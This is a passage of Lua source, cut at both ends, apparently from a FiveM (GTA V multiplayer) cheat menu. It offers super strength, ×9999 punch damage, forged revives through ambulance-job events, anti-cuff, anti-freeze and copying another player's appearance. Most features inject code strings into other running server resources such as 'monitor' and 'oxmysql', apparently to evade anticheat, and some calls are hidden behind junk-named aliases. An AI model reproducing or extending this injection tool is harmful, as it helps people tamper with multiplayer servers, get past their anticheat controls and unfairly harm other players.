                                        if entityType == 3 or entityType == 2 or entityType == 1 then
                                            validTarget = true
                                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                                        end
                                    end

                                    if IsDisabledControlJustReleased(0, 38) then
                                        if validTarget and not holdingEntity then
                                            holdingEntity = true
                                            heldEntity = entityHit

                                            local wfuawruawts = AttachEntityToEntity

                                            if entityType == 3 then
                                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                            elseif entityType == 2 then
                                                holdingCarEntity = true
                                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                            elseif entityType == 1 then
                                                holdingPed = true
                                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                            end
                                        end
                                    elseif IsDisabledControlJustReleased(0, 246) then
                                        if holdingEntity then
                                            local wgfawhtawrs = DetachEntity
                                            local dfgjsdfuwer = ApplyForceToEntity
                                            local sdgfhjwserw = ClearPedTasks

                                            wgfawhtawrs(heldEntity, true, true)
                                            dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                            holdingEntity = false
                                            holdingCarEntity = false
                                            holdingPed = false
                                            heldEntity = nil
                                            sdgfhjwserw(PlayerPedId())
                                        end
                                    end
                                end
                            end)

                            function RotationToDirection(rotation)
                                local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                return direction
                            end

                            function DrawText3Ds(x, y, z, text)
                                local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                                local px, py, pz = table.unpack(GetGameplayCamCoords())
                                local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                                local fov = (1 / GetGameplayCamFov()) * 100
                                scale = scale * fov

                                if onScreen then
                                    SetTextScale(0.0 * scale, 0.35 * scale)
                                    SetTextFont(0)
                                    SetTextProportional(1)
                                    SetTextColour(255, 255, 255, 215)
                                    SetTextDropshadow(0, 0, 0, 0, 155)
                                    SetTextEdge(2, 0, 0, 0, 150)
                                    SetTextDropShadow()
                                    SetTextOutline()
                                    SetTextEntry("STRING")
                                    SetTextCentre(1)
                                    AddTextComponentString(text)
                                    DrawText(_x, _y)
                                end
                            end
                                sendNotification("Super Strength", "Enabled", "success", 2000)
                            end
                        else
                            if canInjectResource() then
                                local targetResource = GetResourceState("monitor") == "started" and "monitor" or
                GetResourceState("oxmysql") == "started" and "oxmysql" or GetCurrentResourceName()
                                MachoInjectResource2(3, targetResource, [[fgawjFmaDjdALaO = false]])
                            else
                                _G.fgawjFmaDjdALaO = false
                            end
                            sendNotification("Super Strength", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Super Punch",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    _G.SuperPunchEnabled = true

                                    CreateThread(function()
                                        while _G.SuperPunchEnabled do
                                            local playerPed = PlayerPedId()
                                            if playerPed and DoesEntityExist(playerPed) then
                                                local weaponHash = GetHashKey("WEAPON_UNARMED")
                                                SetWeaponDamageModifier(weaponHash, 9999.0)
                                            end
                                            Wait(100)
                                        end

                                        local weaponHash = GetHashKey("WEAPON_UNARMED")
                                        SetWeaponDamageModifier(weaponHash, 1.0)
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.SuperPunchEnabled = true

                                CreateThread(function()
                                    while _G.SuperPunchEnabled do
                                        local playerPed = PlayerPedId()
                                        if playerPed and DoesEntityExist(playerPed) then
                                            local weaponHash = GetHashKey("WEAPON_UNARMED")
                                            SetWeaponDamageModifier(weaponHash, 9999.0)
                                        end
                                        Wait(100)
                                    end

                                    local weaponHash = GetHashKey("WEAPON_UNARMED")
                                    SetWeaponDamageModifier(weaponHash, 1.0)
                                end)
                            end
                            sendNotification("Super Punch", "Enabled", "success", 2000)
                        else
                            if canInjectResource() then
                                local code = [[
                                    _G.SuperPunchEnabled = false
                                    CreateThread(function()
                                        local weaponHash = GetHashKey("WEAPON_UNARMED")
                                        SetWeaponDamageModifier(weaponHash, 1.0)
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.SuperPunchEnabled = false
                                CreateThread(function()
                                    local weaponHash = GetHashKey("WEAPON_UNARMED")
                                    SetWeaponDamageModifier(weaponHash, 1.0)
                                end)
                            end
                            sendNotification("Super Punch", "Disabled", "info", 2000)
                        end
                    end
                },                
                {
                    label = "Super Run",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    _G.SuperRunEnabled = true

                                    CreateThread(function()
                                        while _G.SuperRunEnabled do
                                            local ped = PlayerPedId()
                                            if ped and DoesEntityExist(ped) and not IsPedInAnyVehicle(ped, false) then
                                                SetRunSprintMultiplierForPlayer(PlayerId(), 1.45)
                                                SetPedMoveRateOverride(ped, 1.45)
                                            end
                                            Wait(100)
                                        end
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.SuperRunEnabled = true

                                CreateThread(function()
                                    while _G.SuperRunEnabled do
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) and not IsPedInAnyVehicle(ped, false) then
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.45)
                                            SetPedMoveRateOverride(ped, 1.45)
                                        end
                                        Wait(100)
                                    end
                                end)
                            end
                            sendNotification("Super Run", "Enabled", "success", 2000)
                        else
                            if canInjectResource() then
                                local code = [[
                                    _G.SuperRunEnabled = false
                                    CreateThread(function()
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                        local ped = PlayerPedId()
                                        if DoesEntityExist(ped) then
                                            SetPedMoveRateOverride(ped, 1.0)
                                        end
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.SuperRunEnabled = false
                                CreateThread(function()
                                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                    local ped = PlayerPedId()
                                    if DoesEntityExist(ped) then
                                        SetPedMoveRateOverride(ped, 1.0)
                                    end
                                end)
                            end
                            sendNotification("Super Run", "Disabled", "info", 2000)
                        end
                    end
                },                                
                {
                    label = "Copy Appearance (Nearest Player)",
                    type = "button",
                    onConfirm = function()
                        if canInjectResource() then
                            local code = [[
                                CreateThread(function()
                                    local playerPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(playerPed)
                                    local closestPed = nil
                                    local closestDist = 9999.0

                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local ped = GetPlayerPed(pid)
                                        if ped ~= playerPed and DoesEntityExist(ped) then
                                            local dist = #(GetEntityCoords(ped) - myCoords)
                                            if dist < closestDist then
                                                closestDist = dist
                                                closestPed = ped
                                            end
                                        end
                                    end

                                    if closestPed and DoesEntityExist(closestPed) then
                                        local model = GetEntityModel(closestPed)
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do
                                            Wait(0)
                                        end
                                        SetPlayerModel(PlayerId(), model)
                                        SetModelAsNoLongerNeeded(model)
                                        Wait(100)
                                        playerPed = PlayerPedId()

                                        local success, shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird,
                shapeMix, skinMix, thirdMix = GetPedHeadBlendData(closestPed)
                                        if success then
                                            SetPedHeadBlendData(playerPed, shapeFirst, shapeSecond, shapeThird, skinFirst,
                skinSecond, skinThird, shapeMix, skinMix, thirdMix, false)
                                        end

                                        for i = 0, 19 do
                                            local feature = GetPedFaceFeature(closestPed, i)
                                            if feature then
                                                SetPedFaceFeature(playerPed, i, feature)
                                            end
                                        end

                                        for i = 0, 12 do
                                            local success, overlayValue, colourType, firstColour, secondColour, overlayOpacity =
                GetPedHeadOverlayData(closestPed, i)
                                            if success then
                                                SetPedHeadOverlay(playerPed, i, overlayValue, overlayOpacity)
                                                SetPedHeadOverlayColor(playerPed, i, colourType, firstColour, secondColour)
                                            end
                                        end

                                        local hairColor, highlightColor = GetPedHairColor(closestPed)
                                        SetPedHairColor(playerPed, hairColor, highlightColor)

                                        local eyeColor = GetPedEyeColor(closestPed)
                                        SetPedEyeColor(playerPed, eyeColor)

                                        for i = 0, 11 do
                                            local drawable = GetPedDrawableVariation(closestPed, i)
                                            local texture  = GetPedTextureVariation(closestPed, i)
                                            local palette  = GetPedPaletteVariation(closestPed, i)
                                            SetPedComponentVariation(playerPed, i, drawable, texture, palette)
                                        end

                                        for i = 0, 7 do
                                            local prop = GetPedPropIndex(closestPed, i)
                                            local tex  = GetPedPropTextureIndex(closestPed, i)
                                            if prop ~= -1 then
                                                SetPedPropIndex(playerPed, i, prop, tex, true)
                                            else
                                                ClearPedProp(playerPed, i)
                                            end
                                        end
                                    end
                                end)
                            ]]
                            MachoInjectResource2(3, "any", code)
                            sendNotification("Copy Appearance", "Copied full appearance", "success", 2000)
                        else
                            CreateThread(function()
                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestPed = nil
                                local closestDist = 9999.0

                                for _, pid in ipairs(GetActivePlayers()) do
                                    local ped = GetPlayerPed(pid)
                                    if ped ~= playerPed and DoesEntityExist(ped) then
                                        local dist = #(GetEntityCoords(ped) - myCoords)
                                        if dist < closestDist then
                                            closestDist = dist
                                            closestPed = ped
                                        end
                                    end
                                end

                                if closestPed and DoesEntityExist(closestPed) then
                                    local model = GetEntityModel(closestPed)
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do
                                        Wait(0)
                                    end
                                    SetPlayerModel(PlayerId(), model)
                                    SetModelAsNoLongerNeeded(model)
                                    Wait(100)
                                    playerPed = PlayerPedId()

                                    local success, shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird,
                shapeMix, skinMix, thirdMix = GetPedHeadBlendData(closestPed)
                                    if success then
                                        SetPedHeadBlendData(playerPed, shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond,
                skinThird, shapeMix, skinMix, thirdMix, false)
                                    end

                                    for i = 0, 19 do
                                        local feature = GetPedFaceFeature(closestPed, i)
                                        if feature then
                                            SetPedFaceFeature(playerPed, i, feature)
                                        end
                                    end

                                    for i = 0, 12 do
                                        local success, overlayValue, colourType, firstColour, secondColour, overlayOpacity =
                GetPedHeadOverlayData(closestPed, i)
                                        if success then
                                            SetPedHeadOverlay(playerPed, i, overlayValue, overlayOpacity)
                                            SetPedHeadOverlayColor(playerPed, i, colourType, firstColour, secondColour)
                                        end
                                    end

                                    local hairColor, highlightColor = GetPedHairColor(closestPed)
                                    SetPedHairColor(playerPed, hairColor, highlightColor)

                                    local eyeColor = GetPedEyeColor(closestPed)
                                    SetPedEyeColor(playerPed, eyeColor)

                                    for i = 0, 11 do
                                        local drawable = GetPedDrawableVariation(closestPed, i)
                                        local texture  = GetPedTextureVariation(closestPed, i)
                                        local palette  = GetPedPaletteVariation(closestPed, i)
                                        SetPedComponentVariation(playerPed, i, drawable, texture, palette)
                                    end

                                    for i = 0, 7 do
                                        local prop = GetPedPropIndex(closestPed, i)
                                        local tex  = GetPedPropTextureIndex(closestPed, i)
                                        if prop ~= -1 then
                                            SetPedPropIndex(playerPed, i, prop, tex, true)
                                        else
                                            ClearPedProp(playerPed, i)
                                        end
                                    end

                                    sendNotification("Copy Appearance", "Copied full appearance", "success", 2000)
                                else
                                    sendNotification("Copy Appearance", "No nearby player found", "error", 2000)
                                end
                            end)
                        end
                    end
                },                                                
                {
                    type = 'button',
                    label = 'Revive',
                    onConfirm = function()
                        local resourceUsed = false

                        if GetResourceState("wasabi_ambulance") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "wasabi_ambulance", [[
                                    RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                ]])
                            else
                                TriggerEvent("wasabi_ambulance:revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("qb-ambulancejob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "qb-ambulancejob", [[
                                    local ped = PlayerPedId()
                                    local coords = GetEntityCoords(ped)
                                    local heading = GetEntityHeading(ped)

                                    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                    ClearPedBloodDamage(ped)
                                    SetEntityInvincible(ped, false)
                                    SetEntityMaxHealth(ped, 200)
                                    SetEntityHealth(ped, 200)
                                    ResetPedMovementClipset(ped, 0.0)
                                    SetPlayerSprint(PlayerId(), true)
                                ]])
                            else
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local heading = GetEntityHeading(ped)
                                NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                ClearPedBloodDamage(ped)
                                SetEntityInvincible(ped, false)
                                SetEntityMaxHealth(ped, 200)
                                SetEntityHealth(ped, 200)
                                ResetPedMovementClipset(ped, 0.0)
                                SetPlayerSprint(PlayerId(), true)
                            end
                            resourceUsed = true

                        elseif GetResourceState("esx_ambulancejob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "esx_ambulancejob", [[
                                    local ped = PlayerPedId()
                                    local coords = GetEntityCoords(ped)
                                    local heading = GetEntityHeading(ped)

                                    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                    ClearPedTasksImmediately(ped)
                                    SetEntityInvincible(ped, false)
                                    SetEntityMaxHealth(ped, 200)
                                    SetEntityHealth(ped, 200)
                                    ResetPedMovementClipset(ped, 0.0)
                                    SetPlayerSprint(PlayerId(), true)
                                ]])
                            else
                                TriggerEvent('esx_ambulancejob:revive')
                            end
                            resourceUsed = true

                        elseif GetResourceState("ars_ambulancejob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "ars_ambulancejob", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("ars_ambulancejob:healPlayer", { revive = true })
                                ]])
                            else
                                TriggerEvent("ars_ambulancejob:healPlayer", { revive = true })
                            end
                            resourceUsed = true

                        elseif GetResourceState("mc9-medicsystem") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("mc9-medicsystem", [[
                                    RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                ]])
                            else
                                RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                            end
                            resourceUsed = true

                        elseif GetResourceState("scripts") == "started" or GetResourceState("framework") then
                            if canInjectResource() then
                                MachoInjectResource2(3, "deathscreen", [[
                                    local ped = PlayerPedId()
                                    local coords = GetEntityCoords(ped)
                                    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)
                                    ClearPedBloodDamage(ped)
                                ]])
                            else
                                TriggerEvent('deathscreen:revive')
                            end
                            resourceUsed = true

                        elseif GetResourceState("qbx_medical") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "qbx_medical", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("qbx_medical:client:playerRevived")
                                ]])
                            else
                                TriggerEvent("qbx_medical:client:playerRevived")
                            end
                            resourceUsed = true

                        elseif GetResourceState("hospital") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "hospital", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("hospital:client:Revive")
                                ]])
                            else
                                TriggerEvent("hospital:client:Revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("qb-jail") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "qb-jail", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("hospital:client:Revive")
                                ]])
                            else
                                TriggerEvent("hospital:client:Revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("nass_lib") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "nass_lib", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("ak47_qb_ambulancejob:revive")
                                ]])
                            else
                                TriggerEvent("ak47_qb_ambulancejob:revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("ak47_ambulancejob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "ak47_ambulancejob", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("ak47_ambulancejob:revive")
                                ]])
                            else
                                TriggerEvent("ak47_ambulancejob:revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("bjve_utils") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "bjve_utils", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("esx_ambulancejob:revive")
                                ]])
                            else
                                TriggerEvent("esx_ambulancejob:revive")
                            end
                            resourceUsed = true

                        elseif GetResourceState("ak4y-bodyhealth") == "started" then
                            if canInjectResource() then
                                MachoInjectResource2(3, "ak4y-bodyhealth", [[
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("esx_ambulancejob:revive")
                                ]])
                            else
                                TriggerEvent("esx_ambulancejob:revive")
                            end
                            resourceUsed = true
                        end

                        if resourceUsed then
                            sendNotification("Revive", "Player revived", "success", 2000)
                        else
                            sendNotification("Revive", "No resource found", "error", 2000)
                        end
                    end
                },                
                {
                    label = 'Heal',
                    type = 'button',
                    onConfirm = function()
                        if canInjectResource() then
                            MachoInjectResource2(3, 'monitor', [[
                                local ped = PlayerPedId()
                                SetEntityHealth(ped, GetEntityMaxHealth(ped))
                            ]])
                        else
                            local ped = PlayerPedId()
                            SetEntityHealth(ped, GetEntityMaxHealth(ped))
                        end
                        sendNotification("Heal", "Health restored", "success", 2000)
                    end
                },
                {
                    label = 'Set Armor',
                    type = 'button',
                    onConfirm = function()
                        if canInjectResource() then
                            MachoInjectResource2(3, 'monitor', [[
                                local ped = PlayerPedId()
                                SetPedArmour(ped, 100)
                            ]])
                        else
                            local ped = PlayerPedId()
                            SetPedArmour(ped, 100)
                        end
                        sendNotification("Armor", "Armor set to 100", "success", 2000)
                    end
                }                                                                                               
            }
        },
        {
            name = 'Misc',
            submenu = {
                {
                    label = 'Anti Teleport',
                    type = 'checkbox',
                    value = _G.AntiTpEnabled or false,
                    onConfirm = function(setToggle)
                        _G.AntiTpEnabled = setToggle

                        if setToggle then
                            if not _G.AntiTpThread then
                                _G.AntiTpEnabled = true
                                _G.AntiTpThread = true

                                if canInjectResource() then
                                    MachoInjectResource2(3, 'monitor', [[
                                        _G.AntiTpEnabled = true
                                        CreateThread(function()
                                            local lastCoords = GetEntityCoords(PlayerPedId())

                                            while _G.AntiTpEnabled do
                                                local ped = PlayerPedId()
                                                if DoesEntityExist(ped) and not IsEntityDead(ped) then
                                                    local isMoving = IsPedWalking(ped) or IsPedRunning(ped) or
        IsPedSprinting(ped) or IsPedInAnyVehicle(ped, false)
                                                    local currentCoords = GetEntityCoords(ped)
                                                    local distance = #(currentCoords - lastCoords)

                                                    if not isMoving and distance > 10.0 then
                                                        SetEntityCoords(ped, lastCoords.x, lastCoords.y, lastCoords.z,
        false, false, false, false)
                                                    else
                                                        lastCoords = currentCoords
                                                    end
                                                end
                                                Wait(200)
                                            end
                                        end)
                                    ]])
                                else
                                    CreateThread(function()
                                        local lastCoords = GetEntityCoords(PlayerPedId())

                                        while _G.AntiTpEnabled do
                                            local ped = PlayerPedId()
                                            if DoesEntityExist(ped) and not IsEntityDead(ped) then
                                                local isMoving = IsPedWalking(ped) or IsPedRunning(ped) or
        IsPedSprinting(ped) or IsPedInAnyVehicle(ped, false)
                                                local currentCoords = GetEntityCoords(ped)
                                                local distance = #(currentCoords - lastCoords)

                                                if not isMoving and distance > 10.0 then
                                                    SetEntityCoords(ped, lastCoords.x, lastCoords.y, lastCoords.z, false,
        false, false, false)
                                                else
                                                    lastCoords = currentCoords
                                                end
                                            end
                                            Wait(200)
                                        end

                                        _G.AntiTpThread = nil
                                    end)
                                end
                            end
                            sendNotification("Anti Teleport", "Enabled", "success", 2000)
                        else
                            _G.AntiTpEnabled = false

                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    _G.AntiTpEnabled = false
                                ]])
                            else
                            end

                            _G.AntiTpThread = nil
                            sendNotification("Anti Teleport", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Anti Cuff",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                local original_IS_PED_CUFFED = IS_PED_CUFFED
                                local original_IS_PED_BEING_ARRESTED = IS_PED_BEING_ARRESTED

                                IS_PED_CUFFED = function(ped)
                                    return false
                                end

                                IS_PED_BEING_ARRESTED = function(ped)
                                    return false
                                end

                                _G.original_IS_PED_CUFFED = original_IS_PED_CUFFED
                                _G.original_IS_PED_BEING_ARRESTED = original_IS_PED_BEING_ARRESTED
                            ]]

                            if canInjectResource() then
                                MachoInjectResource2(3, "monitor", code)
                            end
                            sendNotification("Anti Cuff", "Enabled", "success", 2000)
                        else
                            local code = [[
                                if _G.original_IS_PED_CUFFED then
                                    IS_PED_CUFFED = _G.original_IS_PED_CUFFED
                                end
                                if _G.original_IS_PED_BEING_ARRESTED then
                                    IS_PED_BEING_ARRESTED = _G.original_IS_PED_BEING_ARRESTED
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResource2(3, "monitor", code)
                            end
                            sendNotification("Anti Cuff", "Disabled", "info", 2000)
                        end
                    end
                },                
                {
                    label = 'Infinite Stamina',
                    type = 'checkbox',
                    value = infiniteStaminaEnabled or false,
                    onConfirm = function(setToggle)
                        infiniteStaminaEnabled = setToggle

                        if setToggle then
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    infiniteStaminaEnabled = true
                                    CreateThread(function()
                                        while infiniteStaminaEnabled and not Unloaded do
                                            local ped = PlayerPedId()
                                            if IsPedOnFoot(ped) and not IsPedSwimming(ped) and not IsPedFalling(ped) and not
                IsPedRagdoll(ped) then
                                                ResetPlayerStamina(PlayerId())
                                            end
                                            Wait(150 + math.random(50, 150))
                                        end
                                    end)
                                ]])
                            else
                                CreateThread(function()
                                    while infiniteStaminaEnabled and not Unloaded do
                                        local ped = PlayerPedId()
                                        if IsPedOnFoot(ped) and not IsPedSwimming(ped) and not IsPedFalling(ped) and not
                IsPedRagdoll(ped) then
                                            ResetPlayerStamina(PlayerId())
                                        end
                                        Wait(150 + math.random(50, 150))
                                    end
                                end)
                            end
                            sendNotification("Infinite Stamina", "Enabled", "success", 2000)
                        else
                            infiniteStaminaEnabled = false
                            sendNotification("Infinite Stamina", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = 'Kick From Vehicle',
                    type = 'checkbox',
                    value = kickFromVehicleEnabled or false,
                    onConfirm = function(setToggle)
                        kickFromVehicleEnabled = setToggle

                        if setToggle then
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    kickFromVehicleEnabled = true
                                    CreateThread(function()
                                        while kickFromVehicleEnabled and not Unloaded do
                                            SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                CreateThread(function()
                                    while kickFromVehicleEnabled and not Unloaded do
                                        SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                                        Wait(0)
                                    end
                                end)
                            end
                            sendNotification("Kick From Vehicle", "Enabled", "success", 2000)
                        else
                            kickFromVehicleEnabled = false
                            sendNotification("Kick From Vehicle", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = 'Show Player IDs',
                    type = 'checkbox',
                    value = showPlayerIDsEnabled or false,
                    onConfirm = function(setToggle)
                        showPlayerIDsEnabled = setToggle

                        if setToggle then

                            if not PlayerIDs then
                                PlayerIDs = true
                                CreateThread(function()
                                    while PlayerIDs do
                                        local myPed = PlayerPedId()
                                        local myCoords = GetEntityCoords(myPed)

                                        for _, id in ipairs(GetActivePlayers()) do
                                            local ped = GetPlayerPed(id)
                                            if NetworkIsPlayerActive(id) and DoesEntityExist(ped) then
                                                local coords = GetEntityCoords(ped)
                                                local dist = #(myCoords - coords)
                                                if dist <= 25.0 then
                                                    local sid = GetPlayerServerId(id)
                                                    local name = GetPlayerName(id)
                                                    local label = string.format("~w~%s : %s", name, sid)

                                                    SetDrawOrigin(coords.x, coords.y, coords.z + 1.1, 0)
                                                    SetTextFont(4)
                                                    SetTextProportional(1)
                                                    SetTextScale(0.35, 0.35)
                                                    SetTextOutline()
                                                    SetTextCentre(true)
                                                    BeginTextCommandDisplayText("STRING")
                                                    AddTextComponentSubstringPlayerName(label)
                                                    EndTextCommandDisplayText(0.0, 0.0)
                                                    ClearDrawOrigin()
                                                end
                                            end
                                        end

                                        Wait(0)
                                    end
                                end)
                            end
                            sendNotification("Show Player IDs", "Enabled", "success", 2000)
                        else
                            PlayerIDs = false
                            sendNotification("Show Player IDs", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = 'No Ragdoll',
                    type = 'checkbox',
                    value = noRagdollEnabled or false,
                    onConfirm = function(setToggle)
                        noRagdollEnabled = setToggle

                        if setToggle then
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    noRagdollEnabled = true
                                    CreateThread(function()
                                        while noRagdollEnabled and not Unloaded do
                                            local ped = PlayerPedId()
                                            SetPedCanRagdoll(ped, false)
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                CreateThread(function()
                                    while noRagdollEnabled and not Unloaded do
                                        local ped = PlayerPedId()
                                        SetPedCanRagdoll(ped, false)
                                        Wait(0)
                                    end
                                end)
                            end
                            sendNotification("No Ragdoll", "Enabled", "success", 2000)
                        else
                            noRagdollEnabled = false
                            local ped = PlayerPedId()
                            SetPedCanRagdoll(ped, true)
                            sendNotification("No Ragdoll", "Disabled", "info", 2000)
                        end
                    end
                },                                
                {
                    label = 'Super Jump',
                    type = 'checkbox',
                    value = superJumpEnabled or false,
                    onConfirm = function(setToggle)
                        superJumpEnabled = setToggle

                        if setToggle then
                            CreateThread(function()
                                while superJumpEnabled and not Unloaded do
                                    SetSuperJumpThisFrame(PlayerId())
                                    Wait(0)
                                end
                            end)
                            sendNotification("Super Jump", "Enabled", "success", 2000)
                        else
                            superJumpEnabled = false
                            sendNotification("Super Jump", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Anti-Freeze",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    if not _G.MoonAntiFreezeThread then
                                        _G.MoonAntiFreezeEnabled = true
                                        _G.MoonAntiFreezeThread = true

                                        CreateThread(function()
                                            while _G.MoonAntiFreezeEnabled do
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)

                                                FreezeEntityPosition(ped, false)

                                                if veh and veh ~= 0 then
                                                    FreezeEntityPosition(veh, false)
                                                end

                                                Wait(500)
                                            end
                                            _G.MoonAntiFreezeThread = nil
                                        end)
                                    end
                                ]]
                                MachoInjectResource2(3, "any", code)
                                sendNotification("Anti-Freeze", "Enabled", "success", 2000)
                            else
                                if not _G.MoonAntiFreezeThread then
                                    _G.MoonAntiFreezeEnabled = true
                                    _G.MoonAntiFreezeThread = true

                                    CreateThread(function()
                                        while _G.MoonAntiFreezeEnabled do
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)

                                            FreezeEntityPosition(ped, false)

                                            if veh and veh ~= 0 then
                                                FreezeEntityPosition(veh, false)
                                            end

                                            Wait(500)
                                        end
                                        _G.MoonAntiFreezeThread = nil
                                    end)
                                end
                                sendNotification("Anti-Freeze", "Enabled", "success", 2000)
                            end
                        else
                            if canInjectResource() then
                                local code = [[_G.MoonAntiFreezeEnabled = false]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.MoonAntiFreezeEnabled = false
                            end
                            sendNotification("Anti-Freeze", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Anti-Stun",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    if not _G.AntiStunThread then
                                        _G.AntiStunEnabled = true
                                        _G.AntiStunThread = true

                                        CreateThread(function()
                                            while _G.AntiStunEnabled do
                                                local ped = PlayerPedId()

                                                SetPedCanRagdoll(ped, false)
                                                SetPedCanBeKnockedOffVehicle(ped, 1)
                                                SetPedConfigFlag(ped, 32, false)
                                                SetPedConfigFlag(ped, 118, false)
                                                SetPedConfigFlag(ped, 166, false)
                                                SetPedConfigFlag(ped, 292, false)

                                                Wait(500)
                                            end

                                            local ped = PlayerPedId()
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanBeKnockedOffVehicle(ped, 0)
                                            SetPedConfigFlag(ped, 32, true)
                                            SetPedConfigFlag(ped, 118, true)
                                            SetPedConfigFlag(ped, 166, true)
                                            SetPedConfigFlag(ped, 292, true)

                                            _G.AntiStunThread = nil
                                        end)
                                    end
                                ]]
                                MachoInjectResource2(3, "any", code)
                                sendNotification("Anti-Stun", "Enabled", "success", 2000)
                            else
                                if not _G.AntiStunThread then
                                    _G.AntiStunEnabled = true
